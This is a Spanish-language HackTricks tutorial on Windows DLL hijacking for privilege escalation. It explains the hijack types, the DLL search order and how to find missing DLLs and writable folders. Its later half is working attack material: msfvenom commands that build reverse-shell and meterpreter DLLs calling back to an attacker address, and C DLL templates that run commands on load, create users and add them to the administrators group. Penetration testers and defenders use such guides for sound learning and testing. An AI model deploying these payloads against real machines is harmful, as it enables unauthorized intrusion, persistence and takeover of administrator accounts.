# Dll Hijacking

<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** revisa los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de GitHub de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Si estás interesado en una **carrera de hacking** y hackear lo inhackeable - **¡estamos contratando!** (_se requiere polaco fluido escrito y hablado_).

{% embed url="https://www.stmcyber.com/careers" %}

## Definición

Primero, aclaremos la definición. El Dll hijacking es, en el sentido más amplio, **engañar a una aplicación legítima/confiable para que cargue un DLL arbitrario**. Términos como _DLL Search Order Hijacking_, _DLL Load Order Hijacking_, _DLL Spoofing_, _DLL Injection_ y _DLL Side-Loading_ a menudo se usan -erróneamente- para decir lo mismo.

El Dll hijacking se puede utilizar para **ejecutar** código, obtener **persistencia** y **escalar privilegios**. De estos 3, el **menos probable** de encontrar es la **escalada de privilegios** con diferencia. Sin embargo, como esto es parte de la sección de escalada de privilegios, me centraré en esta opción. Además, ten en cuenta que independientemente del objetivo, un Dll hijacking se realiza de la misma manera.

### Tipos

Hay una **variedad de enfoques** para elegir, con éxito dependiendo de cómo la aplicación esté configurada para cargar sus DLLs requeridos. Los enfoques posibles incluyen:

1. **Reemplazo de DLL**: reemplazar un DLL legítimo con un DLL malicioso. Esto se puede combinar con _DLL Proxying_ \[[2](https://kevinalmansa.github.io/application%20security/DLL-Proxying/)], lo que asegura que toda la funcionalidad del DLL original permanezca intacta.
2. **DLL search order hijacking**: los DLLs especificados por una aplicación sin una ruta se buscan en ubicaciones fijas en un orden específico \[[3](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)]. El hijacking del orden de búsqueda ocurre al colocar el DLL malicioso en una ubicación que se busca antes que el DLL real. Esto a veces incluye el directorio de trabajo de la aplicación objetivo.
3. **Phantom DLL hijacking**: colocar un DLL malicioso en lugar de un DLL faltante/no existente que una aplicación legítima intenta cargar \[[4](http://www.hexacorn.com/blog/2013/12/08/beyond-good-ol-run-key-part-5/)].
4. **Redirección de DLL**: cambiar la ubicación en la que se busca el DLL, por ejemplo, editando la variable de entorno `%PATH%`, o los archivos `.exe.manifest` / `.exe.local` para incluir la carpeta que contiene el DLL malicioso \[[5](https://docs.microsoft.com/en-gb/windows/win32/sbscs/application-manifests), [6](https://docs.microsoft.com/en-gb/windows/win32/dlls/dynamic-link-library-redirection)].
5. **Reemplazo de DLL en WinSxS**: reemplazar el DLL legítimo con el DLL malicioso en la carpeta WinSxS relevante del DLL objetivo. A menudo se refiere como DLL side-loading \[[7](https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-dll-sideloading.pdf)].
6. **DLL Hijacking de ruta relativa:** copiar (y opcionalmente renombrar) la aplicación legítima a una carpeta accesible por el usuario, junto con el DLL malicioso. En la forma en que se usa, tiene similitudes con (Signed) Binary Proxy Execution \[[8](https://attack.mitre.org/techniques/T1218/)]. Una variación de esto es (llamada de manera algo oximorónica) ‘_bring your own LOLbin_’ \[[9](https://www.microsoft.com/security/blog/2019/09/26/bring-your-own-lolbin-multi-stage-fileless-nodersok-campaign-delivers-rare-node-js-based-malware/)] en la que la aplicación legítima se trae con el DLL malicioso (en lugar de copiarse de la ubicación legítima en la máquina de la víctima).

## Encontrando Dlls faltantes

La forma más común de encontrar Dlls faltantes dentro de un sistema es ejecutando [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) de sysinternals, **estableciendo** los **siguientes 2 filtros**:

![](<../../.gitbook/assets/image (311).png>)

![](<../../.gitbook/assets/image (313).png>)

y mostrando solo la **Actividad del Sistema de Archivos**:

![](<../../.gitbook/assets/image (314).png>)

Si estás buscando **Dlls faltantes en general** debes **dejar** esto ejecutándose por algunos **segundos**.\
Si estás buscando un **Dll faltante dentro de un ejecutable específico** debes establecer **otro filtro como "Nombre del Proceso" "contiene" "\<nombre del ejecutable>", ejecutarlo y detener la captura de eventos**.

## Explotando Dlls faltantes

Para escalar privilegios, la mejor oportunidad que tenemos es poder **escribir un Dll que un proceso con privilegios intentará cargar** en algún **lugar donde se va a buscar**. Por lo tanto, seremos capaces de **escribir** un Dll en una **carpeta** donde el **Dll se busca antes** que la carpeta donde el **Dll original** está (caso raro), o seremos capaces de **escribir en alguna carpeta donde se va a buscar el Dll** y el Dll original **no existe** en ninguna carpeta.

### Orden de búsqueda de Dll

**Dentro de la** [**documentación de Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **puedes encontrar cómo se cargan específicamente los Dlls.**

En general, una **aplicación de Windows** usará **rutas de búsqueda predefinidas para encontrar Dlls** y revisará estas rutas en un orden específico. El Dll hijacking generalmente ocurre al colocar un Dll malicioso en una de estas carpetas asegurándose de que el Dll se encuentre antes que el legítimo. Este problema se puede mitigar si la aplicación especifica rutas absolutas para los Dlls que necesita.

Puedes ver el **orden de búsqueda de Dll en sistemas de 32 bits** a continuación:

1. El directorio desde el cual se cargó la aplicación.
2. El directorio del sistema. Usa la función [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) para obtener la ruta de este directorio. (_C:\Windows\System32_)
3. El directorio del sistema de 16 bits. No hay una función que obtenga la ruta de este directorio, pero se busca. (_C:\Windows\System_)
4. El directorio de Windows. Usa la función [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) para obtener la ruta de este directorio.
1. (_C:\Windows_)
5. El directorio actual.
6. Los directorios que están listados en la variable de entorno PATH. Ten en cuenta que esto no incluye la ruta de aplicación por aplicación especificada por la clave de registro **App Paths**. La clave **App Paths** no se utiliza al calcular la ruta de búsqueda de Dll.

Ese es el **orden de búsqueda predeterminado con SafeDllSearchMode habilitado**. Cuando está deshabilitado, el directorio actual sube al segundo lugar. Para deshabilitar esta característica, crea el valor de registro **HKEY\_LOCAL\_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** y configúralo en 0 (por defecto está habilitado).

Si se llama a la función [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) con **LOAD\_WITH\_ALTERED\_SEARCH\_PATH** la búsqueda comienza en el directorio del módulo ejecutable que **LoadLibraryEx** está cargando.

Finalmente, ten en cuenta que **un Dll podría cargarse indicando la ruta absoluta en lugar de solo el nombre**. En ese caso, ese Dll **solo se buscará en esa ruta** (si el Dll tiene dependencias, se buscarán como si solo se cargaran por nombre).

Hay otras formas de alterar el orden de búsqueda pero no las voy a explicar aquí.

#### Excepciones en el orden de búsqueda de Dll de los documentos de Windows

* Si un **Dll con el mismo nombre de módulo ya está cargado en memoria**, el sistema solo verifica la redirección y un manifiesto antes de resolver al Dll cargado, sin importar en qué directorio esté. **El sistema no busca el Dll**.
* Si el Dll está en la lista de **Dlls conocidos** para la versión de Windows en la que se está ejecutando la aplicación, el **sistema usa su copia del Dll conocido** (y los Dlls dependientes del conocido, si los hay) **en lugar de buscar** el Dll. Para una lista de Dlls conocidos en el sistema actual, consulta la siguiente clave de registro: **HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs**.
* Si un **Dll tiene dependencias**, el sistema **busca** los Dlls dependientes como si se cargaran solo con sus **nombres de módulos**. Esto es cierto **incluso si el primer Dll se cargó especificando una ruta completa**.

### Escalando Privilegios

**Requisitos**:

* **Encontrar un proceso** que se ejecute/se vaya a ejecutar con **otros privilegios** (movimiento horizontal/lateral) que esté **faltando un Dll.**
* Tener **permiso de escritura** en cualquier **carpeta** donde el **Dll** vaya a ser **buscado** (probablemente el directorio ejecutable o alguna carpeta dentro de la ruta del sistema).

Sí, los requisitos son complicados de encontrar ya que **por defecto es algo raro encontrar un ejecutable con privilegios que falte un Dll** y es **aún más raro tener permisos de escritura en una carpeta de la ruta del sistema** (por defecto no puedes). Pero, en entornos mal configurados esto es posible.\
En el caso de que tengas suerte y te encuentres cumpliendo los requisitos, podrías revisar el proyecto [UACME](https://github.com/hfiref0x/UACME). Aunque el **objetivo principal del proyecto es eludir UAC**, puedes encontrar allí un **PoC** de un Dll hijacking para la versión de Windows que puedes usar (probablemente solo cambiando la ruta de la carpeta donde tienes permisos de escritura).

Ten en cuenta que puedes **verificar tus permisos en una carpeta** haciendo:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Y **verifica los permisos de todas las carpetas dentro de PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
También puedes verificar los imports de un ejecutable y los exports de un dll con:
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Para una guía completa sobre cómo **abusar de Dll Hijacking para escalar privilegios** con permisos para escribir en una carpeta de **System Path**, consulta:

{% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

### Herramientas automatizadas

[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) verificará si tienes permisos de escritura en alguna carpeta dentro del PATH del sistema.\
Otras herramientas automatizadas interesantes para descubrir esta vulnerabilidad son las **funciones de PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ y _Write-HijackDll_.

### Ejemplo

En caso de encontrar un escenario explotable, una de las cosas más importantes para explotarlo con éxito sería **crear una dll que exporte al menos todas las funciones que el ejecutable importará de ella**. De todos modos, ten en cuenta que Dll Hijacking es útil para [escalar de nivel de Integridad Medio a Alto **(bypassing UAC)**](../authentication-credentials-uac-and-efs.md#uac) o de [**Alta Integridad a SYSTEM**](./#from-high-integrity-to-system)**.** Puedes encontrar un ejemplo de **cómo crear una dll válida** dentro de este estudio de dll hijacking enfocado en dll hijacking para ejecución: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Además, en la **sección siguiente** puedes encontrar algunos **códigos de dll básicos** que podrían ser útiles como **plantillas** o para crear una **dll con funciones no requeridas exportadas**.

## **Creando y compilando Dlls**

### **Dll Proxifying**

Básicamente un **Dll proxy** es una Dll capaz de **ejecutar tu código malicioso al cargarse** pero también de **exponer** y **funcionar** como se **espera** al **retransmitir todas las llamadas a la biblioteca real**.

Con la herramienta \*\*\*\* [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) \*\*\*\* o \*\*\*\* [**Spartacus**](https://github.com/Accenture/Spartacus) \*\*\*\* puedes **indicar un ejecutable y seleccionar la biblioteca** que quieres proxificar y **generar una dll proxificada** o **indicar la Dll** y **generar una dll proxificada**.

### **Meterpreter**

**Obtener rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Obtén un meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Crear un usuario (x86 no vi una versión x64):**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Tu propia versión

Ten en cuenta que en varios casos la Dll que compiles debe **exportar varias funciones** que serán cargadas por el proceso víctima, si estas funciones no existen el **binario no podrá cargarlas** y el **exploit fallará**.
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
<img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" data-size="original">

Si estás interesado en una **carrera de hacking** y hackear lo inhackeable - **¡estamos contratando!** (_se requiere polaco fluido escrito y hablado_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver a tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Consigue el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sigue** a **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de github** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
